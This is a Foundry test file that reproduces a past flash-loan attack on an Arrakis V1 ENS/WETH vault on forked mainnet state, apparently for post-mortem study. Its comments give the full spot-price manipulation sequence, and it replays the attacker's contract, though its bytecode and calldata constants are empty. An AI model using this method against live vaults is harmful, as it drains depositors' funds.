pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Arrakis Finance V1 (G-UNI) ENS/WETH vault — spot-price deposit/withdraw manipulation — Ethereum
// Attacker net profit ~2.9414 ETH in a single flash-loan-funded tx.
//
// Exploit tx   : 0x6ae3af4b2f25a56594de99cfb31369150dd9ac059c49efe04b9e3e0163dbc672 (block 25817966)
// Attacker EOA : 0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44 (nonce 2 here; tx.origin)
// Attack ctrt  : 0x028d9C17B1a097e7e115A6400203df86339BAf4a (deployed same block, tx idx 0, nonce 1)
// Victim vault : 0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe (Arrakis V1 G-UNI ENS-WETH, proxy)
//   impl       : 0xd68b055fB444D136e3ac4Df023f4c42334F06395 (GUniPool)
//
// Protocol addresses touched:
//   Uni V3 pool  : 0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3 (ENS/WETH 0.3%, the vault's pool())
//   WETH         : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
//   ENS          : 0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72
//   Morpho Blue  : 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb (WETH flash-loan source)
//
// Root cause (reproducible contract mechanism, verified against the on-chain trace, NOT a
// key/signer/privileged-claim compromise):
//   The Arrakis V1 GUniPool values its Uniswap V3 position for user mint()/burn() off the pool's
//   INSTANTANEOUS slot0() spot price (getUnderlyingBalances -> LiquidityAmounts on the live
//   sqrtPriceX96). There is a TWAP / deviation guard in the pool, but it only wraps the manager
//   rebalance() path; the permissionless mint()/burn() deposit-withdraw path has no TWAP and no
//   deviation check. So an attacker can push the V3 tick with a swap, deposit at the skewed
//   valuation, restore the tick, and withdraw a richer token mix than deposited.
//
// Trace evidence (all 18-decimal; ENS and WETH both 18dp):
//   1. Morpho flash loan 1,800 WETH -> attack contract.
//   2. Swap 145.16 WETH -> 13,245 ENS on the V3 pool (skews tick from ~0x276a4 to ~0x27618).
//   3. vault.mint: deposit 1,252.95 WETH + 13,160.6 ENS -> mint 4,487.6 G-UNI shares to attacker,
//      valued at the skewed spot (Minted event, receiver = attack contract).
//   4. Swap back 132.8 ENS -> WETH to restore the tick.
//   5. vault.burn 4,487.6 shares -> redeem 1,251.9 WETH + 13,188.9 ENS (Burned event, richer mix).
//   6. Sell the 13,188.9 ENS surplus back to WETH, repay 1,800 WETH to Morpho.
//   7. 2.941350352900037140 WETH left over, unwrapped to ETH. The contract skims a fixed 0.05 ETH
//      tip (the 8th calldata arg) to 0x4838B106... and forwards the rest, 2.891350352900037140 ETH,
//      to the attacker EOA. Total extracted surplus = 2.9414 ETH (the reported figure).
//
// mint(), burn() and the pool swaps are all plain permissionless public calls (the trace shows an
// unprivileged contract calling them with itself as an arbitrary share receiver; no admin/owner/
// signer path). Confirmed on-chain: vault.pool() == the V3 pool above; mint/burn/getMintAmounts/
// getUnderlyingBalances are all live selectors on the proxy.
//
// Same-block setup IS required: the attack contract does not exist at block-1. This PoC reproduces
// the real pair of txs faithfully — it deploys the attack contract from its EXACT on-chain creation
// bytecode (constructor run, pranked as the attacker EOA so ownership is set as it was), then
// replays the EXACT original exploit calldata (hardcoded verbatim), pranking the attacker EOA as
// both msg.sender and tx.origin. No attack logic is reconstructed.
//
// Run:
//   forge test --contracts ./src/test/2026-08/ArrakisGUNI_exp.sol -vvv

contract ArrakisGUNI_exp is Test {
    address internal constant ATTACKER = 0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44;
    address internal constant VAULT = 0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe;
    address internal constant POOL = 0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant ENS = 0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72;
    address internal constant TIP = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97; // fixed 0.05 ETH skim

    address internal attack; // attack contract, deployed at the real address from real creation code

    // Exact creation bytecode of 0x028d9C17... (input of deploy tx 0xc78cc026..., verbatim).
    bytes internal constant CREATION_CODE =
        hex"";

    // Exact calldata of the original exploit tx (selector 0xb03ee932 + args), verbatim.
    // args: (vault, pool, weth, ens, morpho, flashAmount=1800e18, 150e18, 5e16)
    bytes internal constant EXPLOIT_CALLDATA =
        hex"";

    function setUp() public {
        // block-1: real protocol state immediately before the exploit tx executed.
        vm.createSelectFork("mainnet", 25817965);
    }

    function testExploit() public {
        // Reproduce the real deploy tx (nonce 1): deploy the attack contract from its exact
        // on-chain creation code, pranked as the attacker EOA so the constructor sets ownership
        // exactly as it did on-chain. Address will differ from 0x028d... but bytecode is identical.
        vm.prank(ATTACKER, ATTACKER);
        bytes memory code = CREATION_CODE;
        address deployed;
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }
        require(deployed != address(0), "deploy failed");
        attack = deployed;

        uint256 eoaBefore = ATTACKER.balance;
        uint256 tipBefore = TIP.balance;
        emit log_named_decimal_uint("attacker ETH before", eoaBefore, 18);

        // Reproduce the real exploit tx (nonce 2): replay exact calldata, attacker EOA is both
        // msg.sender and tx.origin.
        vm.prank(ATTACKER, ATTACKER);
        (bool ok,) = attack.call(EXPLOIT_CALLDATA);
        require(ok, "exploit replay failed");

        uint256 eoaGain = ATTACKER.balance - eoaBefore; // net forwarded to the attacker EOA
        uint256 tipGain = TIP.balance - tipBefore; // fixed 0.05 ETH skim
        uint256 totalSurplus = eoaGain + tipGain; // total value extracted from the vault, unwrapped

        emit log_named_decimal_uint("attacker ETH after", ATTACKER.balance, 18);
        emit log_named_decimal_uint("attacker EOA net gain (ETH)", eoaGain, 18);
        emit log_named_decimal_uint("fixed tip skimmed (ETH)", tipGain, 18);
        emit log_named_decimal_uint("total extracted surplus (ETH)", totalSurplus, 18);

        // Total extracted surplus matches the on-chain Profit event / reported ~2.94 ETH.
        assertApproxEqAbs(
            totalSurplus, 2.941350352900037140 ether, 1e15, "surplus off traced ~2.9414 ETH"
        );
        // Attacker EOA keeps the surplus minus the fixed 0.05 ETH tip.
        assertApproxEqAbs(
            eoaGain, 2.891350352900037140 ether, 1e15, "EOA net off traced ~2.8914 ETH"
        );
    }
}
